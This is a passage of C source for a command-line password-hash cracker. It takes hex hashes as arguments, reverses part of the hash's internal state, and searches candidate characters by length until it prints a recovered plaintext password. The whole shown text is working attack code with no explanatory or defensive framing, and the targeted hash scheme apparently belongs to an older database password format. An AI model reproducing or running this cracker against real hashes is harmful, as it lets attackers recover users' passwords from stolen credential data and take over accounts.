  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
  i = -1;
  sum = 7;
  state1_ary[0] = 1345345333L;
  state2_ary[0] = 0x12345671L;

  while (1) {
    while (i < stop) {
      i++;
      pass_ary[i] = MIN_CHAR;
      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
      sum += MIN_CHAR;
      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
      state2_ary[i+1] = state2_ary[i]
        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
    }

    state1 = state1_ary[i+1];
    state2 = state2_ary[i+1];
    step = (state1 & 0x3f) + sum;
    xor1 = step*MIN_CHAR + (state1 << 8);
    xor2 = (state2 << 8) ^ state1;

    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
      newstate2 = state2 + (xor1 ^ xor2);
      newstate1 = state1 ^ xor1;

      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
      div = (newstate1 & 0x3f) + sum + c;
      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
      if (diff % div != 0) continue;
      d = diff / div;
      if (d < MIN_CHAR || d > MAX_CHAR) continue;

      div = (newstate3 & 0x3f) + sum + c + d;
      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
      if (diff % div != 0) continue;
      e = diff / div;
      if (e < MIN_CHAR || e > MAX_CHAR) continue;

      pass_ary[i+1] = c;
      pass_ary[i+2] = d;
      pass_ary[i+3] = e;
      return 1;
    }

    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
      sum -= MAX_CHAR;
      i--;
    }
    if (i < 0) break;
    pass_ary[i]++;
    xor_ary[i] += step_ary[i];
    sum++;
    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
    state2_ary[i+1] = state2_ary[i]
      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
  }

  return 0;
}

void crack(char *hash)
{
  int i, len;
  u32 targ1, targ2, targ3;
  int pass[MAX_LEN];

  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
    printf("Invalid password hash: %s\n", hash);
    return;
  }
  printf("Hash: %08lx%08lx\n", targ1, targ2);
  targ3 = targ2 - targ1;
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);

  for (len = 3; len <= MAX_LEN; len++) {
    printf("Trying length %d\n", len);
    if ( crack0(len-4, targ1, targ3, pass) ) {
      printf("Found pass: ");
      for (i = 0; i < len; i++)
        putchar(pass[i]);
      putchar('\n');
      break;
    }
  }
  if (len > MAX_LEN)
    printf("Pass not found\n");
}

int main(int argc, char *argv[])
{
  int i;
  if (argc <= 1)
    printf("usage: %s hash\n", argv[0]);
  for (i = 1; i < argc; i++)
    crack(argv[i]);
  return 0;
}
```

